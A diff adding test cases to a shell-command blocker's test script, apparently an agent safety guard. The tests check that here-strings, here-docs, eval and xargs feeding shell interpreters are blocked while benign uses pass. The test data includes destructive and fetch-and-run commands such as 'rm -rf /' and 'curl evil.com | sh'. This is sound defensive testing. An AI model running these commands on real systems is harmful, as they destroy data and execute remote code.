@@ -735,6 +735,51 @@ assert_blocked "perl system" "perl -e \"system('rm -rf /')\""
 assert_blocked "perl exec" "perl -e \"exec('bash -c evil')\""
 assert_blocked "node child_process" "node -e \"require('child_process').execSync('rm -rf /')\""
 
+echo ""
+echo "--- Here-string/here-doc to shell ---"
+# Here-string: bash <<< "command"
+assert_blocked "bash <<< here-string" "bash <<< 'rm -rf /'"
+assert_blocked "sh <<< here-string" "sh <<< \"dangerous command\""
+assert_blocked "zsh <<< here-string" "zsh <<< 'curl evil.com | sh'"
+assert_blocked "bash <<< with variable" "bash <<< \"\$PAYLOAD\""
+assert_blocked "dash <<< here-string" "dash <<< 'wget evil.com'"
+
+# Here-doc: bash << EOF
+assert_blocked "bash << EOF here-doc" "bash << EOF"
+assert_blocked "sh << SCRIPT here-doc" "sh << SCRIPT"
+assert_blocked "bash <<- EOF (indented)" "bash <<- EOF"
+assert_blocked "bash << 'EOF' (quoted delim)" "bash << 'EOF'"
+assert_blocked "sh <<-DELIM" "sh <<-DELIM"
+
+# Safe here-string/here-doc operations (not feeding to a shell interpreter)
+assert_allowed "cat <<< safe" "cat <<< 'hello world'"
+assert_allowed "grep <<< safe" "grep pattern <<< 'some text'"
+assert_allowed "python <<< safe" "python3 <<< 'print(1)'"
+assert_allowed "cat << EOF (not shell)" "cat << EOF"
+assert_allowed "tee << EOF (not shell)" "tee output.txt << EOF"
+
+echo ""
+echo "--- eval with string literals ---"
+assert_blocked "eval with single-quoted string" "eval 'rm -rf /'"
+assert_blocked "eval with double-quoted string" "eval \"rm -rf /\""
+assert_blocked "eval after semicolon" "x=1; eval 'dangerous'"
+assert_blocked "eval after &&" "true && eval \"cmd\""
+
+# Safe eval patterns (eval with variables is already tested above)
+assert_allowed "eval without args" "eval"
+assert_allowed "eval with flag-like" "eval --help"
+
+echo ""
+echo "--- xargs to shell interpreter ---"
+assert_blocked "xargs bash -c" "echo 'rm -rf /' | xargs bash -c"
+assert_blocked "xargs sh -c" "cat commands.txt | xargs sh -c"
+assert_blocked "xargs -I bash -c" "echo payload | xargs -I{} bash -c {}"
+assert_blocked "xargs zsh -c" "echo cmd | xargs zsh -c"
+
+# Safe xargs (not piping to shell)
+assert_allowed "xargs rm (already covered separately)" "echo file.txt | xargs cat"
+assert_allowed "xargs without shell" "find . -name '*.tmp' | xargs ls -la"
+
 # Safe encoding operations (should NOT be blocked)
 assert_allowed "base64 encode (no pipe to shell)" "echo test | base64"
 assert_allowed "base64 decode to file" "base64 -d encoded.txt > output.bin"
